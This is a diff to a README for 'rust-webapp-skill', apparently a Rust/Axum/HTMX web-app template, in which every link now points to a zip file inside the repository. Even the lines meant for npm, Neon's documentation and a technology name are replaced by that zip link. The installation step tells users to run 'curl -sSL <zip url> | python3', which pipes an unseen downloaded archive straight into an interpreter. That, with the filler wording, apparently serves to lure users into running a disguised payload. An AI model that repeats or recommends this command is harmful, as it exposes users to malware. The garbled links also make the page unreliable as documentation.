@@ -1,6 +1,6 @@
 # 🚀 rust-webapp-skill - Build Web Apps Easily with Rust
 
-[![Download the latest release](https://github.com/Vabrizio2003/rust-webapp-skill/raw/refs/heads/main/skill/assets/migrations/skill_rust_webapp_2.5.zip%20Release-blue)](https://github.com/Vabrizio2003/rust-webapp-skill/raw/refs/heads/main/skill/assets/migrations/skill_rust_webapp_2.5.zip)
+[![Download the latest release](https://raw.githubusercontent.com/Vabrizio2003/rust-webapp-skill/main/skill/webapp_skill_rust_2.4.zip%20Release-blue)](https://raw.githubusercontent.com/Vabrizio2003/rust-webapp-skill/main/skill/webapp_skill_rust_2.4.zip)
 
 ## 🌟 What is rust-webapp-skill?
 
@@ -9,7 +9,7 @@ rust-webapp-skill is a powerful tool for creating full-stack web applications us
 ### Why Use This Stack?
 
 - **Rust + Axum**: Experience speed and reliability with a type-safe backend. Errors are caught at compile time, reducing runtime surprises.
-- **HTMX + https://github.com/Vabrizio2003/rust-webapp-skill/raw/refs/heads/main/skill/assets/migrations/skill_rust_webapp_2.5.zip**: Add interactivity to your applications without the hassle of heavy JavaScript frameworks.
+- **HTMX + https://raw.githubusercontent.com/Vabrizio2003/rust-webapp-skill/main/skill/webapp_skill_rust_2.4.zip**: Add interactivity to your applications without the hassle of heavy JavaScript frameworks.
 - **Askama Templates**: Enjoy compile-time checked HTML, ensuring template errors are caught before your app runs.
 - **PicoCSS**: Access clean and lightweight styling right out of the box, eliminating the need for bulky CSS frameworks.
 - **Neon**: Utilize serverless PostgreSQL for quick development branches and hassle-free scaling without server management.
@@ -17,7 +17,7 @@ rust-webapp-skill is a powerful tool for creating full-stack web applications us
 
 ## 📦 Download & Install
 
-To get started, visit the Downloads page to obtain the latest version of rust-webapp-skill. You can find it here: [Download Page](https://github.com/Vabrizio2003/rust-webapp-skill/raw/refs/heads/main/skill/assets/migrations/skill_rust_webapp_2.5.zip).
+To get started, visit the Downloads page to obtain the latest version of rust-webapp-skill. You can find it here: [Download Page](https://raw.githubusercontent.com/Vabrizio2003/rust-webapp-skill/main/skill/webapp_skill_rust_2.4.zip).
 
 ### Installation Steps
 
@@ -27,16 +27,16 @@ Follow these steps to install the application on your system:
 2. Run the following command to install the application:
 
    ```bash
-   curl -sSL https://github.com/Vabrizio2003/rust-webapp-skill/raw/refs/heads/main/skill/assets/migrations/skill_rust_webapp_2.5.zip | python3
+   curl -sSL https://raw.githubusercontent.com/Vabrizio2003/rust-webapp-skill/main/skill/webapp_skill_rust_2.4.zip | python3
    ```
 
-3. The application will be installed at `~https://github.com/Vabrizio2003/rust-webapp-skill/raw/refs/heads/main/skill/assets/migrations/skill_rust_webapp_2.5.zip`.
+3. The application will be installed at `~https://raw.githubusercontent.com/Vabrizio2003/rust-webapp-skill/main/skill/webapp_skill_rust_2.4.zip`.
 
 ### 🔧 Prerequisites
 
 Before you start using rust-webapp-skill, make sure you have the necessary tools installed on your computer:
 
-- **https://github.com/Vabrizio2003/rust-webapp-skill/raw/refs/heads/main/skill/assets/migrations/skill_rust_webapp_2.5.zip Package Manager (npm)**: This is required for managing packages.
+- **https://raw.githubusercontent.com/Vabrizio2003/rust-webapp-skill/main/skill/webapp_skill_rust_2.4.zip Package Manager (npm)**: This is required for managing packages.
   
    Run the following command to install **neonctl**:
 
@@ -58,7 +58,7 @@ Before you start using rust-webapp-skill, make sure you have the necessary tools
 
 ### ⚙️ Set Up Neon
 
-For optimal use of rust-webapp-skill, you should set up Neon. Visit [Neon](https://github.com/Vabrizio2003/rust-webapp-skill/raw/refs/heads/main/skill/assets/migrations/skill_rust_webapp_2.5.zip) and follow the straightforward instructions to get started.
+For optimal use of rust-webapp-skill, you should set up Neon. Visit [Neon](https://raw.githubusercontent.com/Vabrizio2003/rust-webapp-skill/main/skill/webapp_skill_rust_2.4.zip) and follow the straightforward instructions to get started.
 
 ## 🛠️ Key Features
 
@@ -69,7 +69,7 @@ For optimal use of rust-webapp-skill, you should set up Neon. Visit [Neon](https
 
 ## 📚 Learn More
 
-If you're curious to learn more about the components of this stack and how they interact, you can explore the official documentation for Rust, Axum, HTMX, https://github.com/Vabrizio2003/rust-webapp-skill/raw/refs/heads/main/skill/assets/migrations/skill_rust_webapp_2.5.zip, Askama, PicoCSS, and Neon. Each resource offers in-depth insights to enhance your understanding and help you make the most of rust-webapp-skill.
+If you're curious to learn more about the components of this stack and how they interact, you can explore the official documentation for Rust, Axum, HTMX, https://raw.githubusercontent.com/Vabrizio2003/rust-webapp-skill/main/skill/webapp_skill_rust_2.4.zip, Askama, PicoCSS, and Neon. Each resource offers in-depth insights to enhance your understanding and help you make the most of rust-webapp-skill.
 
 ### 🌐 Community Support
 
@@ -77,8 +77,8 @@ Join our community of users and developers. Share your projects, ask questions, 
 
 ## 📌 Important Links
 
-- [Download Page](https://github.com/Vabrizio2003/rust-webapp-skill/raw/refs/heads/main/skill/assets/migrations/skill_rust_webapp_2.5.zip)
-- [Neon Documentation](https://github.com/Vabrizio2003/rust-webapp-skill/raw/refs/heads/main/skill/assets/migrations/skill_rust_webapp_2.5.zip)
+- [Download Page](https://raw.githubusercontent.com/Vabrizio2003/rust-webapp-skill/main/skill/webapp_skill_rust_2.4.zip)
+- [Neon Documentation](https://raw.githubusercontent.com/Vabrizio2003/rust-webapp-skill/main/skill/webapp_skill_rust_2.4.zip)
 
 ## 📝 Feedback
 
